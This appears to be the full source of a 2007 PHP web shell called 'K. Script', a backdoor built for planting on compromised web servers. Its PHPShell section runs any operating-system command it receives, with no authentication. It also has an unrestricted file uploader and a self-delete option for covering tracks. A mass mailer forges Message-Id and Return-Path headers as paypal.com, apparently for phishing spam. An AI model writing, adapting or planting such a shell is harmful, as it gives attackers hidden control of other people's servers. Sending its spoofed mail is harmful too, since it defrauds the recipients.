<?php
$Title = "K. Script v0.3 Beta By $alla$$: ";
$GraphicHeader = '<meta http-equiv="Content-Type" content="text/html; charset=windows-1257">
	<style type="text/css">
	body{ background-color: #F6F6F6; text-align: center; width: 100%;	padding: 0px; margin: 0px; }
	#unCenter{ width: 300px; margin-left: auto;	margin-right: auto; text-align: left; }
	#unCenterShell{ width: 600px; margin-left: auto; margin-right: auto; text-align: left; }
	#unCenterMailer{ width: 700px; margin-left: auto; margin-right: auto; text-align: left; }
	#unCenterProxy{	width: 750px; margin-left: auto; margin-right: auto; }
	#unCenterHeader{ width: 800px; margin-left: auto; margin-right: auto; text-align: center; }
	.Marged{ margin-top: 20px; }
	.Input{	border: 1px solid #DADADA; }
	.Table{	border: 1px solid #DADADA; background-color: White;	padding: 10px; font: 11px Tahoma, Verdana, sans-serif; line-height: 17px; color: Gray; }
	.TableHeader{	border: 1px solid #DADADA; background-color: White;	padding: 2px; font: 11px Tahoma, Verdana, sans-serif; line-height: 17px; color: Gray; }
	a{ text-decoration: none; color: #003473; }
	a:hover{ text-decoration: none;	color: #F5822B;}
	img{ border: 0px; }
	h1{	font-size: 14px; font-weight: bold;	padding: 0px; margin-bottom: 7px; }
	.Black{	color: Gray; font: 11px Tahoma, Verdana, sans-serif; }
	.BlackRealy{ color: Black; font: 12px Tahoma, Verdana, sans-serif; }
	</style>';
$SiteHeader = '</head><body><br>
	<a href="?MainPage"><img src="http://kenshin-lt.net/images/fuck.gif" width="50" height="50" alt="Home"></a>
	<div><hr width="90%" size="1.5px" noshade="noshade"></div>';
$GraphicFooter = '<div><br><hr width="90%" size="1.5px" noshade="noshade"></div>
	<div align="center" class="black">[<a href="?ProxyDetect">ProxyDetect</a>]
	<span class="BlackRealy">  |  </span>[<a href="?Uploader">FileUploader</a>]
	<span class="BlackRealy">  |  </span>[<a href="?PHPShell">PHPShell</a>]
	<span class="BlackRealy">  |  </span>[<a href="?PortCheck">PortCheck</a>]
	<span class="BlackRealy">  |  </span>[<a href="?Mailer">MassMailer</a>]
	<span class="BlackRealy">  |  </span>[<a href="?DeleteMe">Delete Me</a>]</div>
	<div align="center" class="Black">Copyright &copy; 2007 <a href="mailto:shaun.wades@gmail.com">Shaun$$</a></div>
	</body></html>';
$Slash = '/';

if ($_SERVER['QUERY_STRING'] == '') header("Location: http://" . $_SERVER['HTTP_HOST'] . $_SERVER['PHP_SELF'] . "?MainPage");

if(isset($_GET['PHPShell'])) {
$passwd = array();
$aliases = array();
session_start();
if (empty($_SESSION['cwd']) || !empty($_REQUEST['reset'])) {
    $_SESSION['cwd'] = getcwd();
    $_SESSION['history'] = array();
    $_SESSION['output'] = '';
}
if (!empty($_REQUEST['command'])) {
    if (get_magic_quotes_gpc()) {
      $_REQUEST['command'] = stripslashes($_REQUEST['command']);
}
if (($i = array_search($_REQUEST['command'], $_SESSION['history'])) !== false)
    unset($_SESSION['history'][$i]);
    array_unshift($_SESSION['history'], $_REQUEST['command']);
    $_SESSION['output'] .= '$ ' . $_REQUEST['command'] . "\n";
    if (ereg('^[[:blank:]]*cd[[:blank:]]*$', $_REQUEST['command'])) {
    $_SESSION['cwd'] = dirname(__FILE__);
    } elseif (ereg('^[[:blank:]]*cd[[:blank:]]+([^;]+)$', $_REQUEST['command'], $regs)) {
if ($regs[1][0] == '/') {
    $new_dir = $regs[1];
    } else {
    $new_dir = $_SESSION['cwd'] . '/' . $regs[1];
}
    while (strpos($new_dir, '/./') !== false)
    $new_dir = str_replace('/./', '/', $new_dir);
    while (strpos($new_dir, '//') !== false)
    $new_dir = str_replace('//', '/', $new_dir);
    while (preg_match('|/\.\.(?!\.)|', $new_dir))
    $new_dir = preg_replace('|/?[^/]+/\.\.(?!\.)|', '', $new_dir);
    if ($new_dir == '') $new_dir = '/';
    if (@chdir($new_dir)) {
    $_SESSION['cwd'] = $new_dir;
    } else {
    $_SESSION['output'] .= "cd: could not change to: $new_dir\n";
}
    } else {
    chdir($_SESSION['cwd']);
    $length = strcspn($_REQUEST['command'], " \t");
    $token = substr($_REQUEST['command'], 0, $length);
if (isset($aliases[$token]))
     $_REQUEST['command'] = $aliases[$token] . substr($_REQUEST['command'], $length);
     $p = proc_open($_REQUEST['command'],
     array(1 => array('pipe', 'w'),
	       2 => array('pipe', 'w')),
           $io);
    while (!feof($io[1])) {
    $_SESSION['output'] .= htmlspecialchars(fgets($io[1]),
    ENT_COMPAT, 'UTF-8');
}
    while (!feof($io[2])) {
    $_SESSION['output'] .= htmlspecialchars(fgets($io[2]),
    ENT_COMPAT, 'UTF-8');
}
    fclose($io[1]);
    fclose($io[2]);
    proc_close($p);
}
}
if (empty($_SESSION['history'])) {
    $js_command_hist = '""';
    } else {
    $escaped = array_map('addslashes', $_SESSION['history']);
    $js_command_hist = '"", "' . implode('", "', $escaped) . '"';
}


echo '<xml version="1.0" encoding="UTF-8">';
echo '<html><head><title>'.$Title.' PHPShell</title>';
echo $GraphicHeader;
?>

<script type="text/javascript" language="JavaScript">
  var current_line = 0;
  var command_hist = new Array(<?php echo $js_command_hist ?>);
  var last = 0;
function key(e) {
if (!e) var e = window.event;
if (e.keyCode == 38 && current_line < command_hist.length-1) {
  command_hist[current_line] = document.shell.command.value;
  current_line++;
  document.shell.command.value = command_hist[current_line];
}
if (e.keyCode == 40 && current_line > 0) {
  command_hist[current_line] = document.shell.command.value;
  current_line--;
  document.shell.command.value = command_hist[current_line];
}
}
function init() {
  document.shell.setAttribute("autocomplete", "off");
  document.shell.output.scrollTop = document.shell.output.scrollHeight;
  document.shell.command.focus();
}
</script>
<? echo $SiteHeader; ?>
<body onload="init()">
<?php
error_reporting (E_ALL);
if (empty($_REQUEST['rows'])) $_REQUEST['rows'] = 10;
?>
<div id="unCenterShell"><div class="Marged"><div class="Table">
<center><div>Current Directory: <?php echo $_SESSION['cwd'] ?></div></center>
</div></div></div>

<div id="unCenterShell"><div class="Marged"><div class="Table"><center>
<div><form name="shell" action="<?php echo $_SERVER['PHP_SELF'] .'?PHPShell'?>" method="post"></div>
<div><textarea class="Input" name="output" readonly="readonly" cols="68" rows="<?php echo $_REQUEST['rows'] ?>">
	<?php
	$lines = substr_count($_SESSION['output'], "\n");
	$padding = str_repeat("\n", max(0, $_REQUEST['rows']+1 - $lines));
	echo rtrim($padding . $_SESSION['output']);
	?>
</textarea></div>
<div>$&nbsp;&nbsp;<input class="Input" name="command" type="text" onkeyup="key(event)" size="89" tabindex="1"><div>
</center></div></div></div>


<div id="unCenter"><div class="Marged"><div class="Table"><center>
<div><input type="submit" value="Execute Command" />&nbsp;<input type="submit" name="reset" value="Reset" /></div>
<div>Rows: <input type="text" name="rows" value="<?php echo $_REQUEST['rows'] ?>" /></div>
</form></center></div></div></div>
<? echo $GraphicFooter; }


if(isset($_GET['Uploader'])){
echo '<html><head><title>'.$Title.' Uploader</title>';
echo $GraphicHeader; echo $SiteHeader;

if(isset($_POST['upl_files'])){
  echo '<div id="unCenter"><div class="Marged"><div class="Table">
  <div>Uploaded Files:<br></div>';
  //print_r($_FILES['file_n']);
  $up_mas = $_FILES['file_n'];
  $mas_name = array();
  $mas_tmp = array();
  for($i=0; $i<10; $i++){
    if(!empty($up_mas['name'][$i])){
      $j = count($mas_name);
      $mas_name[$j] = $up_mas['name'][$i];
      $mas_tmp[$j] = $up_mas['tmp_name'][$i];
      }
    }
  for($i=0; $i<count($mas_name); $i++){
    $upl_file = $_POST['mas_dir'].$mas_name[$i];
    if(move_uploaded_file($mas_tmp[$i], $upl_file)){
      echo '<a href="'.$mas_name[$i].'">'.$mas_name[$i].'</a>,&nbsp';
      }
    }
  }
echo "</div></div></div>";
?>
	<div id="unCenter"><div class="Marged"><div class="Table"><center><br>
	<form enctype="multipart/form-data" method="post" action="">
	<div>Upload Files to:
	<? echo'<input class="input" type="text" name="mas_dir" value='.getcwd().$Slash.' size="40"><br><br>'; ?>
	<? for($i=0; $i<10; $i++){ echo '<div><input class="Input" type="file" name="file_n[]"></div>'; } ?>
  	</div><div><input type="reset" name="reset" value="Reset">&nbsp;<input type="submit" name="upl_files" value="upload"></div>
	</center></div></div></div>
<? echo $GraphicFooter; }


if(isset($_GET['MainPage'])){
echo '<html><head><title>'.$Title.'</title>';
echo $GraphicHeader; echo $SiteHeader;

print "<div id=unCenterHeader><div class=TableHeader>";
print((@ini_get('safe_mode'))?("<b>Safe Mode: <font color=green>ON</font><b>"):("<b>Safe Mode: <font color=red>OFF</font>"));
print "</b><span class=BlackRealy>  |  </span>";
print "<b>PHP version: <font color=green>".@phpversion()."</font></b>";
print "<span class=BlackRealy>  |  </span>";
print((@function_exists('curl_version'))?("<b>cURL: <font color=green>ON</font>"):("<b>cURL: <font color=red>OFF</font>"));
print "</b><span class=BlackRealy>  |  </span>";
if(@function_exists('mysql_connect')){ echo "<b>MySQL: <font color=green>ON</font>"; } else { echo "<b>MySQL: <font color=red>OFF</font>"; }
print "</b><span class=BlackRealy>  |  </span>";
if(@function_exists('mssql_connect')){ echo "<b>MSSQL: <font color=green>ON</font>"; } else { echo "<b>MSSQL: <font color=red>OFF</font>"; }
print "</b><span class=BlackRealy>  |  </span>";
if(@function_exists('pg_connect')){ echo "<b>PostgreSQL: <font color=green>ON</font>"; } else { echo "<b>PostgreSQL: <font color=red>OFF</font>";}
print "</b><span class=BlackRealy>  |  </span>";
if(@function_exists('ocilogon')){ echo "<b>Oracle: <font color=green>ON</font>"; } else { echo "<b>Oracle: <font color=red>OFF</font>"; }
print "</b></b></div></div>";

echo<<<MainPageGraphic
<div id="unCenter">
	<div class="Marged">
		<div class="Table">
			<center>
			<div></div>
			<div><a href="?ProxyDetect">ProxyDetect</a></div>
			<div><a href="?Uploader">FileUploader</a></div>
			<div><a href="?PHPShell">PHPShell</a></div>
			<div><a href="?PortCheck">PortCheck</a></div>
			<div><a href="?Mailer">MassMailer</a></div>
			<div><hr width="150px" size="1px" noshade="noshade"></div>
			<div><a href="?DeleteMe">Delete me</a></div>
			</center>
		</div>
	</div>
</div>
MainPageGraphic;
echo $GraphicFooter; }


if(isset($_GET['PortCheck'])) {
echo '<html><head><title>'.$Title.' PortCheck</title>';
echo $GraphicHeader; echo $SiteHeader;
echo "<div id=\"unCenter\"><div class=\"Marged\"><div class=\"Table\" style=\"padding-left: 20\">";
echo "<div align=\"center\">Under Reconstruction</div>";
echo "</div></div></div>";
echo $GraphicFooter;
}

if(isset($_GET['Mailer'])) {
echo '<html><head><title>'.$Title.' Mailer</title>';
echo $GraphicHeader;
echo $SiteHeader;

if(!$action) $action = "";

if ($action=="send"){
	$message = urlencode($message);
	$message = ereg_replace("%5C%22", "%22", $message);
	$message = urldecode($message);
	$message = stripslashes($message);
	$subject = stripslashes($subject);
}
?>
<!-- Mailer -->
<form name="Mailer" method="post" action="<? echo $_SERVER['PHP_SELF'] . '?Mailer' ?>" enctype="multipart/form-data">

<div id="unCenterMailer"><div class="Marged"><div class="Table">
<div align="left">
	<div style="padding-left: 20px;">Your Email: <input class="input" type="text" name="from" value="<?=$from?>" size="20">
	<span style="padding-left: 122px;"></span>Your Name: <input class="input" type="text" name="realname" value="<?=$realname?>" size="20"></div>
	<div style="padding-left: 26px;">Reply-To: <input class="input" type="text" name="replyto" value="<?=$replyto?>" size="20">
	<span style="padding-left: 123px;"></span>Attach File: <input class="input" type="file" name="file" size="20"></div>
	<div style="padding-left: 33px;">Subject: <input class="input" type="text" name="subject" value="<?=$subject?>" size="90"></div>
</div>
	<div align="left"><span style="padding-left: 4px;"></span>Letter:<span style="padding-left: 392px;"></span>Recipients:</div>
	<div><textarea class="input" name="message" cols="50" rows="10"><?=$message?></textarea>
	<textarea class="input" name="emaillist" cols="25" rows="10"><?=$emaillist?></textarea></div>
</div></div></div>

<div id="unCenter"><div class="Marged"><div class="Table">
<div align="center"><input type="radio" name="contenttype" value="plain">Plain
	<input type="radio" name="contenttype" value="html" checked>HTML
	<input type="hidden" name="action" value="send"><input class="input" type="submit" value="Send eMails"></div>
</div></div></div></form>
<?
if ($action=="send"){

	if (!$from && !$subject && !$message && !$emaillist){
	echo '<div id="unCenter"><div class="Marged"><div class="Table"><center>
	<div>Please complete all fields before sending your message.</div>
	</center></div></div></div>';
	echo $GraphicFooter;
	exit;
	}

	$allemails = split("\n", $emaillist);
	$numemails = count($allemails);

	If ($file_name){
		@copy($file, "./$file_name") or die("The file you are trying to upload couldn't be copied to the server");
		$content = fread(fopen($file,"r"),filesize($file));
		$content = chunk_split(base64_encode($content));
		$uid = strtoupper(md5(uniqid(time())));
		$name = basename($file);
	}
	echo '<div id="unCenter"><div class="Marged"><div class="Table"><center>';

		$messid = "1140150615.28818";

	for($x=0; $x<$numemails; $x++){
		$to = $allemails[$x];
		if ($to){
		$to = ereg_replace(" ", "", $to);
		$message = ereg_replace("&email&", $to, $message);
		$subject = ereg_replace("&email&", $to, $subject);
		print "Sending: [ $to ] ";
		flush();
		$header = "From: $realname <$from>\r\n";
		$header .= "Reply-To: $replyto\r\n";
		$header .= "MIME-Version: 1.0\r\n";
		If ($file_name) $header .= "Content-Type: multipart/mixed; boundary=$uid\r\n";
		If ($file_name) $header .= "--$uid\r\n";
		$header .= "Message-Id:<$messid@paypal.com>\r\n";
		$header .= "Return-Path: <service@paypal.com>\r\n";
		$header .= "Content-Type: text/$contenttype\r\n";
		$header .= "Content-Transfer-Encoding: 8bit\r\n\r\n";
		$header .= "$message\r\n";
		If ($file_name) $header .= "--$uid\r\n";
		If ($file_name) $header .= "Content-Type: $file_type; name=\"$file_name\"\r\n";
		If ($file_name) $header .= "Content-Transfer-Encoding: base64\r\n";
		If ($file_name) $header .= "Content-Disposition: attachment; filename=\"$file_name\"\r\n\r\n";
		If ($file_name) $header .= "$content\r\n";
		If ($file_name) $header .= "--$uid--";
		mail($to, $subject, "", $header);
		print "........Success!<br>";
		flush();
		}
	}
echo "</center></div></div></div>";
}
?>
<!-- </Mailer> -->
<? echo $GraphicFooter; } ?>

<? if(isset($_GET['DeleteMe'])){
echo '<html><head><title>'.$Title.' DeleteMe</title>';
echo $GraphicHeader; echo $SiteHeader;
$del = $_GET['del'];
if($del=="TRUE"){
$url = "http://" .$_SERVER['HTTP_HOST']. "/";
print "<META HTTP-EQUIV=\"Refresh\" CONTENT=\"0; URL= $url \">";
unlink('kscr.php');
}
?>

<div id="unCenter"><div class="Marged"><div class="Table">
<center><div></div>
<div style="font-size 10px: bold; font-weight: bold;">Delete Me?</div>
<br><div><a href="?DeleteMe&del=TRUE">Yes (Delete)</a><img src="" border="0" height="0" width="50"><a href="?MainPage">No (Go Home)</a></div>
</center></div></div></div>

<? echo $GraphicFooter; } ?>

<? if(isset($_GET['ProxyDetect'])){
echo $GraphicHeader; echo $SiteHeader;
echo '<html><head><title>'.$Title.' ProxyDetect</title>';
?>

<div id="unCenterProxy"><div class="Marged"><div class="Table">
<div class="Menu" align=center><b><u>Your IP Address:</u></b><br><br></div>

<?
$proxy = "";
$viaproxy = "";
if(!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) $proxy = TRUE;
if($proxy) $viaproxy = "Via Proxy";
$host = gethostbyaddr($_SERVER['REMOTE_ADDR']);
$ip = getenv("REMOTE_ADDR");
if($host==$ip) $host = "N/A";
echo "<div align=center ><b>".$ip." (".$host.")</b>".$viaproxy."</div>";
?>

<hr size=1 width=80%><br>
<div class=Menu align=center><b><u>Your HTTP Headers:</u></b><br><br/></div>
<div align="left" style="padding-left: 10px">
<?
if(!empty($_SERVER['HTTP_CONNECTION'])) echo "<li> <span style=\"color: Black;\">HTTP_CONNECTION: </span><b>".$_SERVER['HTTP_CONNECTION']."</b><br>";
if(!empty($_SERVER['HTTP_KEEP_ALIVE'])) echo "<li> <span style=\"color: Black;\">HTTP_KEEP_ALIVE: </span><b>".$_SERVER['HTTP_KEEP_ALIVE']."</b><br>";
if(!empty($_SERVER['HTTP_ACCEPT'])) echo "<li> <span style=\"color: Black;\">HTTP_ACCEPT: </span><b>".$_SERVER['HTTP_ACCEPT']."</b><br>";
if(!empty($_SERVER['HTTP_ACCEPT_CHARSET'])) echo "<li> <span style=\"color: Black;\">HTTP_ACCEPT_CHARSET: </span><b>".$_SERVER['HTTP_ACCEPT_CHARSET']."</b><br>";
if(!empty($_SERVER['HTTP_ACCEPT_ENCODING'])) echo "<li> <span style=\"color: Black;\">HTTP_ACCEPT_ENCODING: </span><b>".$_SERVER['HTTP_ACCEPT_ENCODING']."</b><br>";
if(!empty($_SERVER['HTTP_ACCEPT_LANGUAGE'])) echo "<li> <span style=\"color: Black;\">HTTP_ACCEPT_LANGUAGE: </span><b>".$_SERVER['HTTP_ACCEPT_LANGUAGE']."</b><br>";
if(!empty($_SERVER['HTTP_HOST'])) echo "<li> <span style=\"color: Black;\">HTTP_HOST: </span><b>".$_SERVER['HTTP_HOST']."</b><br>";
if(!empty($_SERVER['HTTP_USER_AGENT'])) echo "<li> <span style=\"color: Black;\">HTTP_USER_AGENT: </span><b>".$_SERVER['HTTP_USER_AGENT']."</b><br>";
if($proxy) echo "<li> <span style=\"color: Black;\">HTTP_X_FORWARDED_FOR: </span><b>".$_SERVER['HTTP_X_FORWARDED_FOR']."</b><br>";
if (($proxy) && (!empty($_SERVER['HTTP_VIA']))){ echo "<li> <span style=\"color: Black;\">HTTP_VIA: </span><b>".$_SERVER['HTTP_VIA']."</b><br>"; }
?>
</div></div></div></div>

<? echo $GraphicFooter; } exit;?>
